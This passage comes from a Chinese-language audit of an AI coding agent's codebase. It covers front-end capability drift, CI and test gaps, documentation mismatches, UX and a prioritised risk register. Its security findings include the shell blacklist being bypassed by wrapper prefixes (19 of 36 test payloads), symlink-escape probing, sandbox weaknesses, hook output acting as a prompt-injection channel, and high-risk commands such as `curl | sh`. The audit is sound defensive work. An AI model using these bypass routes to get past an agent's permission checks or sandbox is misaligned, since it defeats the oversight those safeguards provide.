- **协议层**：`minicoding-protocol` 的 `ts-rs` 导出 + Web 侧 `pnpm gen-types` + CI 有 `git diff --exit-code` 门禁校验生成 DTO 与 Rust 源一致。**这是很扎实的契约管理。**
- **聚合根**：`SessionManager`（1,232 行）+ `Runtime` + `Session` 被 server 的所有前端复用。
- **Runtime 装配**：CLI/TUI 全量委托 `minicoding-sdk::builder`（TUI 的 Cargo.toml 直接 path 依赖 sdk）。

### 7.2 【核心问题】能力矩阵不对等

| 能力 | CLI | TUI | **Web** | **Desktop** |
|---|:--:|:--:|:--:|:--:|
| 基础对话 / 工具 | ✅ | ✅ | ✅ | ✅ |
| 权限审批（prompter） | Interactive | TUI 弹窗 | `ServerPrompter` | 同 Web |
| AGENTS.md 项目文档注入（C-05） | ✅ | ✅ | ✅（R8 补齐） | ✅ |
| git / web / memory / ui.ask 工具 | ✅ | ✅ | ✅（R8 补齐） | ✅ |
| **Hook registry / asyncRewake** | ✅ | ✅ | **❌** | **❌** |
| **AutoMemory 上下文注入** | ✅ | ✅ | **❌** | **❌** |
| **子 Agent（`task.spawn`）** | ✅ | ✅ | **❌**（`NoopSubagentRunner`） | **❌** |
| **配置热更新（S-22）** | ✅ | ✅ | **❌** | **❌** |

**用户体验后果**（这是真实的 UX 问题，不只是技术债）：

1. 用户在桌面版配置了 Hook → **静默不生效**，无任何提示；
2. 用户在 Web 会话里说"记住我喜欢 4 空格缩进"→ `memory.write` 写入了，**但下次会话不会注入**（AutoMemory contributor 未接入）→ 用户认为"它没记住"；
3. 模型在 Web 会话中调用 `task.spawn` → 走 `NoopSubagentRunner` → 子任务**静默返回空**，模型可能据此编造结果。

**建议**：
1. **最高优先级**：合并双轨 builder（ARCH-1）；
2. 合并前，在 Web 前端**显式降级提示**：当工具不存在时，不要在工具列表里暴露它（或在响应中返回"该能力在当前形态不可用"），好过静默 no-op；
3. 增加**能力矩阵一致性测试**：断言四个装配点注册的工具集合与能力注入项相同——这样漂移会被 CI 立刻抓住。

### 7.3 Web 前端

`crates/minicoding-web` 是独立 npm 项目（React 19 + Vite + Tailwind v4），CI 有 **oxlint + tsc + vitest + build + 生成 DTO 一致性** 五道门禁——**对一个后端主导的项目来说，前端工程化做到这个程度是意外的好**。

主要问题：**`minicoding-web` 的 Rust 侧代码为 0 行、测试为 0 个**（它本就不含 Rust），需确认 vitest 覆盖了 NDJSON/SSE 的关键状态机（R8 修过 FE-6/FE-7 的"DELETE 后排队 turn 仍执行、NDJSON/ACP 事件双份"，说明这类 bug 是真实发生过的）。建议补充针对**中断/重连/事件去重**的契约测试。

---

## 8. 工程化、测试与版本管理

### 8.1 CI/CD：**扎实，10 道门禁**

`fmt` / `clippy -D warnings` / `test` / `coverage ≥80%` / `cargo audit` / `cargo deny` / `typos` / `cross-platform(macOS+Windows)` / `windows-target-check` / `web(oxlint+tsc+vitest+build)` + `desktop` 单独编译。

亮点：
- **工具链与 action 均以 SHA 钉版**（`dtolnay/rust-toolchain@6c977a6c...`，ENG-11），这是正确的供应链安全实践；
- **`windows-target-check`** 用 `cargo xwin` 在 Linux 上交叉编译 MSVC target 提前暴露 Windows 平台分支错误——**这个 job 的存在本身就是从"两次发布失败"中总结出来的**，工程反思能力强；
- `concurrency.cancel-in-progress`（PR 级）节省 runner。

**问题**：

#### **CI-1（P1）：覆盖率门禁排除了恰恰最需要覆盖的三个 crate**

```yaml
run: cargo llvm-cov --workspace ... --exclude minicoding-tui --exclude minicoding-cli --exclude minicoding-server --fail-under-lines 80
```

被排除的正是 **CLI / TUI / Server** —— 也就是**三个前端装配点**。"覆盖率 ≥80%"实际只覆盖库 crate，而 §7.2 的能力漂移、R8 修的 FE-6/FE-7/FE-10~FE-13 全部发生在被排除的层。

且"coverage visibility"步骤对每个被排除 crate 跑 `cargo llvm-cov ... || true`——**`|| true` 意味着它永远不会失败**，纯装饰。

**建议**：给这三个 crate 设一个**独立的、较低的门槛**（如 40%）并**强制生效**，让趋势可见且不可倒退。

#### **CI-2（P2）：无集成测试 / E2E / 安全回归 / 模糊测试**

CI 只有单元门禁。缺少：
- **安全回归套件**（§6.2 的 36 个 payload 应当固化进 CI）；
- **跨形态一致性测试**（§7.2）；
- 端到端测试（起真实 server + mock provider + 跑一个完整会话）；
- 属性测试/fuzzing（对 shell 命令 tokenizer、路径解析器、SSE 解析器这类"输入空间大且有安全含义"的组件，fuzz 收益极高）。

#### **CI-3（P2）：`cargo audit` 已知有 unmaintained 传递依赖**

CI 注释坦承：`number_prefix 0.4.0`（indicatif 传递依赖，RUSTSEC-2025-0119 unmaintained）被允许通过。属于合理权衡，但应记录技术债并在 indicatif 升级后清理。

### 8.2 测试

**修正一个容易误判的数据**：初看 `tests/` 目录只有 3,969 行、部分 crate 只有 5 行，容易得出"测试严重不足"。**实际大部分测试是内联 `#[cfg(test)]`**：

| crate | 内联 `#[test]` 数 |
|---|:--:|
| minicoding-tools | **354** |
| minicoding-core | **223** |
| minicoding-providers | **217** |
| minicoding-policy | **146** |
| minicoding-storage | 119 |
| minicoding-context | 105 |
| minicoding-hooks | 103 |
| minicoding-memory | 97 |
| minicoding-server | 71 |
| minicoding-mcp | 46 |
| minicoding-sandbox | 44 |
| minicoding-protocol | 47 |
| minicoding-extension-sdk | 39 |
| minicoding-tui | 38 |
| minicoding-journal | 32 |
| minicoding-sdk | 15 |
| minicoding-cli | **9** |
| minicoding-desktop | 6 |
| **合计** | **1,711**（+ tests/ 目录 69） |

**评价**：库 crate 测试密度合理，`providers`/`policy`/`tools` 的测试质量高（见 §4.1）。**`minicoding-cli` 只有 9 个内联测试**是明显洼地——而 CLI 恰恰是主力形态，且 `commands/serve.rs` 当前有未提交修改。

**建议**：为 CLI 的关键路径（配置优先级解析、cred 存储、exec 批量模式）补集成测试。

### 8.3 版本与发布

- **版本一致性优秀**：18 个 crate 全部 `version.workspace = true`，0 个硬编码；`package.json` / `tauri.conf.json` 均为 `0.3.9`，与 workspace 对齐；44 个 git tag，`v0.3.5~v0.3.9` 规律发布。
- **CHANGELOG 质量高**：43k 行，Keep a Changelog 格式，v0.3.9 条目**不只是 commit 列表**，而是按 `Performance / Security / Reliability` 分组并解释了**为什么这样改**（如工具调度并行化条目还解释了"为何不用启发式 DAG 依赖判定"）。**这是能帮助用户判断升级风险的 changelog。**

### 8.4 其他工程化问题

#### **ENG-1（P1）：构建钉在 nightly**

`rust-toolchain.toml`：`channel = "nightly-2026-08-18"`，而 `Cargo.toml` 声明 `rust-version = "1.99"`。

注释解释得很诚实：上游 nightly 在 tokio opaque type 上触发 rustc ICE，故钉版；且 `rust-version = "1.99"` 是 MSRV 声明，实际构建用 nightly，"两者不矛盾但需说明"。

**评价**：**诊断是对的，钉版是合理的应急手段，但对"生产级"是硬阻塞**：
- nightly 无稳定性保证，钉在 2026-08-18 意味着**无法获得后续任何编译器安全修复**；
- 外部贡献者/自建 CI 必须精确复现这个 nightly；
- 一旦该 nightly 从镜像下架（注释里已提到 TUNA 镜像缺失问题），构建即不可复现。

**建议**：把"回迁 stable"作为**最高优先级技术债**——稳定 1.99 发布后立即切换 `channel = "stable"`；同时把 ICE 复现用例提给 rustup 上游。

#### **ENG-2（P2）：`target/` 目录 243 GB**

`target/debug` 单目录 241 GB。虽是本地环境问题（且 `.gitignore` 已正确排除），但：
- 说明长期未清理，且 `lto = "thin"` + `codegen-units = 1` 的 release profile 会进一步放大；
- 新人 clone 后首次构建成本极高。

**建议**：在 `docs/build-guide.md` 中加入 `cargo sweep` / 定期清理建议；考虑为 CI 缓存设置 key 策略避免缓存无限膨胀。

#### **ENG-3（P3）：ENG-8「lint 收敛到 workspace 级」只完成了一半**

`Cargo.toml` 加了 `[workspace.lints.clippy]`，18 个 crate 也都声明了 `[lints] workspace = true`。**但 22 处 crate 内 `#![deny(clippy::all, clippy::pedantic)]` 属性全部保留**（`lib.rs`/`main.rs`）。

注释说"存量 crate 内属性保留兼容"——但这意味着**原目标（"规则变更需改 18 处"）并未解决**：现在要改的是 22 + 1 处。且重复声明会造成读者困惑（到底哪份生效？）。

**建议**：删除全部 22 处 crate 内属性（workspace 级已覆盖），或更新文档说明"两者并存且有意保留"。

#### **ENG-4（P3）：仓库根目录 `tmp/` 有个人文件**

`tmp/` 下有 `interview-prep.md`、`session-ses_0056.md`（165KB，疑似真实会话记录）、`string_utils.py`、`tutorial/`。**已被 `.gitignore` 正确排除（0 个被追踪）**，所以无泄露风险。但 165KB 的会话记录若含真实代码/凭证，放在项目根目录仍有误提交/误打包风险。建议移出仓库。

---

## 9. 【重点】文档与实现的裂缝

项目有 8 轮自审（R2–R8）且文档体量惊人（25,805 行），但**文档与代码仍有 4 类可验证的矛盾**。这是本次审查中**最应该优先修的一类问题**——因为用户和未来的 AI 助手都会信任文档。

### DOC-1（P1）：4 份文档声称支持"项目级 `hooks.toml`"，代码中不存在

| 文档 | 行 | 内容 |
|---|---|---|
| `docs/modules.md` | 714 | 「从 `config.hooks`（`.minicoding/hooks.toml`）…」 |
| `docs/getting-started.md` | 632 | 「Hook 从 `.minicoding/hooks.toml`（**项目级**）或 `~/.minicoding/hooks.toml`（用户级）加载」 |
| `docs/product-manual.md` | 1528 | 同上 |
| `docs/troubleshooting.md` | 1547 | `.minicoding/hooks.toml` 配置示例 |

而 `crates/minicoding-core/src/config.rs:1-2`：

> 「单一 user 级文件：`MINICODING_HOME/config.toml`；**project 层分层加载为规划项**，见 `roadmap.md`」

且**全仓 `.rs` 无任何代码读取项目级 hooks 文件**。

**风险方向**：当前是"文档比代码更危险地描述"——用户会以为可以配置（然后困惑为什么不生效）；更糟的是，**若将来有人照文档实现，就会引入"克隆仓库即执行"的供应链风险**。

**建议**：立即修正 4 处文档；`troubleshooting.md:1583` 那句「安全审查时检查 `hooks.toml` 是否有可疑 Hook」也应改为用户级路径。

### DOC-2（P1）：`docs/architecture.md` §7.1 的配置优先级含不存在的"项目级配置"

```
CLI args > Env vars > Project config (./.minicoding.toml) > User config (~/.minicoding/config.toml) > Built-in defaults
```

与 DOC-1 同源——**项目级配置分层尚未实现**。三份文档（`architecture.md` §7.1、`modules.md` §12.3、`getting-started.md`）与 `config.rs` 相互矛盾。

### DOC-3（P2）：`docs/modules.md` §11 描述的 tools 依赖图与真实 `Cargo.toml` 不符

文档称 tools 是"组合层，可依赖多个领域 crate"，实际全部注释掉（见 ARCH-2）。

### DOC-4（P2）：`docs/modules.md` §1.2 的 core 模块树文件名已过期

文档列 `trait.rs / registry.rs / context.rs`，实际为 `trait.rs / registry.rs / render.rs`（无 `context.rs`，多了 `render.rs`）。

### DOC-5（P3）：`docs/design.md` §8.2 标题层级错乱

`### 8.2 长期记忆格式规范` 下嵌套了 `## pref.lang`、`## decision.runtime`（`##` 级别低于 `###`），导致目录结构破损。

> **根因与建议**：这 5 处裂缝不是偶然——它们都源于**"文档先行、实现滞后"**的开发节奏（这在 AI 辅助开发中很常见）。建议引入**文档-实现一致性测试**：例如把 `RuntimeConfig` 的加载路径、工具注册表清单、crate 依赖方向写成断言测试，让"文档漂移"变成 CI 失败。项目已有 A8 架构守卫（10 个 crate 有 `tests/architecture.rs`），**但 cli/context/desktop/extension-sdk/protocol/server/storage/tools 这 8 个 crate 没有**——建议补齐，特别是 `server` 与 `tools`。

---

## 10. 用户体验（UX）

### 10.1 问题

**UX-1（P1）：默认模式下每条 shell 命令都要确认**

实测：`echo hi` 和 `cargo test` 在 `Default` 模式下都返回 `ASK`。安全性上正确，**但交互成本极高**——一次常规重构可能触发几十次确认。

对比 Claude Code 的做法：基于**命令前缀**的会话级/项目级 allowlist + 结构性风险分级（而非简单的"有副作用就问"）。

**建议**：
1. 建立**只读/无害命令自动放行清单**（`ls/cat/git status/git diff/grep/find/cargo check/...`），这些即使有副作用也仅限于读；
2. 按**命令族 + 参数形态**做会话级/项目级记忆（"本会话允许 `cargo *`"、"本项目允许 `npm test`"）；
3. 对 `rm`/`git push -f`/`curl | sh` 等真正高危的保持逐次确认。

这能在**不降低安全水位**的前提下大幅降低摩擦——当前设计是"安全但不实用"，长期看用户会直接切到 `full-access` 模式，**反而更不安全**。

**UX-2（P2）：能力不可用时应显式提示，而非静默失效**（见 §7.2）

**UX-3（P2）：`/undo` 默认关闭且仅内存**

README：「`/undo` 会话内 operation 级撤销（`FileChangeJournal`，特性门控；**默认关闭、纯内存——不落盘，仅会话内有效**）」。

这是**安全功能却默认关闭**——用户在误操作后最需要的就是撤销，但默认拿不到。且"纯内存"意味着崩溃后丢失。

**建议**：默认开启，落盘到会话目录（注意脱敏），并显著提示该功能可用。

**UX-4（P2）：`doctor` 的输出未被充分利用**

`doctor` 已能如实报告 `is_hardened()`、landlock ABI、网络限制可用性。但这些信息只在用户主动执行时可见。**建议在会话启动时，若沙箱被降级（内核不支持 / Windows / seccomp 未启用），打印一行显著提示**——用户有权知道自己是否在"裸奔"。

### 10.2 做得好的 UX

- **配置优先级统一**：CLI > env > config.toml > 默认值，四形态一致；
- **API key 统一存 OS keyring**（`KEYRING_SERVICE = "minicoding"`，CLI/server/desktop 共享同一 entry），并有 `rpassword` 隐藏输入（FE-5，修过回显问题）；
- **`--plan` 只读模式** + `plan.exit` 预批准，双重只读强制；
- **`exec --sandbox external-sandbox`** 面向 CI/容器的批量模式。

---

## 11. 风险登记册（按优先级）

### P0 — 阻塞生产级使用
*（本次审查**未发现** P0 级"默认姿态下可被直接利用"的漏洞。默认模式对所有危险命令返回 `ASK`，路径沙箱实测可靠。以下两项是"生产级就绪"意义上的阻塞项。）*

| ID | 风险 | 依据 |
|---|---|---|
| **P0-1** | 构建钉在 `nightly-2026-08-18`，无稳定性保证、无法获得后续编译器修复、镜像下架即不可构建 | `rust-toolchain.toml` |
| **P0-2** | Web/Desktop 与 CLI/TUI 能力严重不对等（缺 Hook / AutoMemory / 子 Agent），且随每次新增能力持续漂移 | §7.2，`runtime_builder.rs:11-16` |

### P1 — 应尽快修复

| ID | 风险 | 依据 |
|---|---|---|
| **P1-1** | Shell 黑名单词法启发式，实测 36 payload 中 19 个可绕过（auto-approve/full-access 模式下是唯一防线） | §6.2 实测表 |
| **P1-2** | 双轨 Runtime builder 导致能力漂移 | ARCH-1 |
| **P1-3** | Windows 沙箱无 FS/网络隔离，`is_hardened()==false`，README 却称"内核级隔离" | `windows.rs:1-25` |
| **P1-4** | Windows Job Object 驱动用 FIFO 传策略，并发 spawn 可错配策略 | `windows.rs` S24 |
| **P1-5** | Linux 网络限制需 6.7+ 且仅 TCP；旧内核静默跳过（仅 `tracing::warn`） | `linux.rs:255-268` |
| **P1-6** | `ApproxTokenizer` 系统性低估（emoji −84.6%、JSON 转义中文 −52.6%），导致压缩触发过晚、真实 400 | §4.2 实测 |
| **P1-7** | 4 份文档声称项目级 `hooks.toml`，代码不支持；若照文档实现将引入"克隆即执行"风险 | DOC-1 |
| **P1-8** | 覆盖率门禁排除 cli/server/tui，且 visibility 步骤带 `|| true` 永不失败 | CI-1 |
| **P1-9** | `is_hardened()` 仅被 doctor 消费，降级到 NoopDriver 时系统照常运行且用户不知情 | ARCH-4 |

### P2 — 应规划修复

| ID | 风险 |
|---|---|
| P2-1 | 无安全回归测试套件 / E2E / fuzzing（CI-2） |
| P2-2 | `calibrate()` 口径不一致（actual 含 system+tools，cache 仅 messages）→ 系统性过早压缩 |
| P2-3 | `fs.read` 边界校验在 tool 层而非 policy 层，策略层对只读操作返回 `Allow`，审计不留痕 |
| P2-4 | `~` 开头路径在策略层按相对路径处理（当前无害，属潜在逃逸口） |
| P2-5 | Ollama 用 cl100k 估算本地模型 token |
| P2-6 | `capabilities()` 模型窗口为硬编码前缀表，必然过期 |
| P2-7 | seccomp 默认关闭且为 denylist |
| P2-8 | AutoMemory 无失效/冲突治理机制 |
| P2-9 | Hook 输出注入上下文 = 提示词注入通道，无来源标注 |
| P2-10 | `minicoding-cli` 仅 9 个内联测试 |
| P2-11 | 默认模式每条 shell 命令都询问，长期使用会驱使用户切到 full-access（UX-1） |
| P2-12 | `/undo` 默认关闭且仅内存（UX-3） |
| P2-13 | `ExternalSandbox` 模式 fail-open 且不探测容器环境 |
| P2-14 | 8 个 crate 缺架构守卫测试（含 server/tools） |

### P3 — 改进项

| ID | 风险 |
|---|---|
| P3-1 | ENG-8 lint 收敛只做一半，22 处 crate 内 `deny` 属性残留 |
| P3-2 | `target/` 243 GB 未清理 |
| P3-3 | 仓库根 `tmp/` 有个人文件（已 gitignore） |
| P3-4 | `docs/design.md` §8.2 标题层级错乱 |
| P3-5 | `docs/modules.md` §1.2 core 模块树文件名过期 |
| P3-6 | AGENTS.md 无陈旧性提示 |

---

## 12. 改进建议（分阶段）

### 阶段一：止血清单（1–2 周）

1. **修 4 处 hooks.toml 文档**（DOC-1/DOC-2）——最低成本、最高风险规避；
2. **把 §6.2 的 36 个 payload 固化为 `crates/minicoding-policy/tests/security_regression.rs`**，先让绕过可见，再逐个修；
3. **黑名单三处廉价加固**：动词取 basename + 循环剥离包装前缀（`env/xargs/nice/nohup/command/busybox/timeout`）、动词比较统一小写、`ROOT_TARGETS` 扩展到系统关键目录 + `$HOME`/`~`/`..`；
4. **覆盖率门禁**：给 cli/server/tui 设独立门槛（如 40%）并**去掉 `|| true`**；
5. **`minicoding-doctor` 结果前置到会话启动**：沙箱降级时打印显著警告。

### 阶段二：结构性修复（1–2 月）

6. **合并双轨 builder**（ARCH-1）——让 server 委托 sdk builder，消除能力漂移；
7. **增加能力矩阵一致性测试**：断言所有装配点注册的工具集与注入项一致；
8. **分词器校准**：修 `\uXXXX` 转义计数与 emoji 计权；为 Ollama 提供按模型族的估算系数；
9. **回迁 stable 工具链**（ENG-1）——稳定 1.99 发布后立即执行，并把 ICE 用例提上游；
10. **Windows 驱动修复**：FIFO 改 pid→policy 映射；评估 AppContainer 落地路径；
11. **补 8 个 crate 的架构守卫测试**，并把文档-实现一致性（配置路径、依赖方向）纳入断言。

### 阶段三：体验与成熟度（2–3 月）

12. **权限分级 UX**（UX-1）：只读/无害命令自动放行 + 命令族级会话/项目 allowlist；
13. **`/undo` 默认开启并落盘**（UX-3）；
14. **E2E 测试**：起真实 server + mock provider + 完整会话；
15. **对命令 tokenizer / 路径解析 / SSE 解析做 fuzzing**；
16. **AutoMemory 失效治理**（记忆关联源文件 mtime + 指纹，过期降权）；
17. **Landlock 网络限制补齐**：评估 network namespace 或 seccomp 拦截 UDP；
18. **README 沙箱能力矩阵如实化**（引用代码里的"诚实边界"描述）。

---

## 13. 结语

**这是一个值得尊重的项目。** 判断依据不是代码量，而是三类只有真正踩过坑才会有的痕迹：

1. **对自身缺陷的诚实**——代码中大量"诚实边界"注释（landlock 只管 TCP、Windows 无 FS 隔离、`pre_exec` 内 malloc 的残余风险、黑名单覆盖不到 base64 变形）。**这种诚实让使用者能正确评估风险，比任何营销文案都有价值。**
2. **从失败中提炼的防御**——`windows-target-check` job 是从"两次发布失败"中总结出的；`ContextLength` 紧急压缩是从"真实 400"中总结出的；`is_hardened()` 如实返回 false 而不是夸大防护。
3. **八轮自审留下的可追溯决策记录**——每个修复都带编号（SEC-1/CTX-3/PT4-3/FE-12）与理由，不是随意的 patch。

**核心差距不在能力，而在一致性**：文档与代码不一致（§9）、四个前端之间不一致（§7.2）、安全默认值与宣传口径不一致（§2.2、§6.2）。建议下一轮（R10）把主题定为**"一致性"**而非继续加功能——把双轨 builder 合并、把文档裂缝补上、把绕过矩阵固化成测试。这三项做完，这个项目的可信度会有量级提升。

---

## 附录 A：本次审查实际执行的验证命令

```bash
# 构建验证
cargo check --workspace --all-targets        # 通过，0 warning，10.2s
rustc --version                              # 1.100.0-nightly (8fa1c96cf 2026-08-17)

# 权限矩阵探测（临时 crate /tmp/bypass_probe，已清理）
BuiltinPolicy::check("shell.run", {"cmd": <36 payloads>}, BypassPermissions)
BuiltinPolicy::check("shell.run", {...}, Default)                    # 严重性校准
BuiltinPolicy::check("fs.write",  {path}, workdir=<真实临时目录>)      # 含符号链接逃逸

# 分词精度
TiktokenTokenizer::new_cl100k().count(s) vs ApproxTokenizer.count(s)

# 依赖/结构
逐 crate 解析 [dependencies]、[lints]、#![deny(clippy...)]
git ls-files | wc -l ; du -sh target ; git tag | wc -l
```

## 附录 B：规模数据

| 指标 | 值 |
|---|---|
| Rust 源码 | 84,195 行（297 文件） |
| 内联 `#[test]` | 1,711 |
| `tests/` 目录测试 | 69 |
| `unimplemented!`/`todo!` | **0** |
| `unreachable!` | 4（均可辩护） |
| 文档 | 25,805 行 |
| git 追踪文件 | 509 |
| git tag | 44（v0.3.5–v0.3.9 近期） |
| `target/` 体积 | 243 GB |
| crate 数 | 18 Cargo + 1 npm |
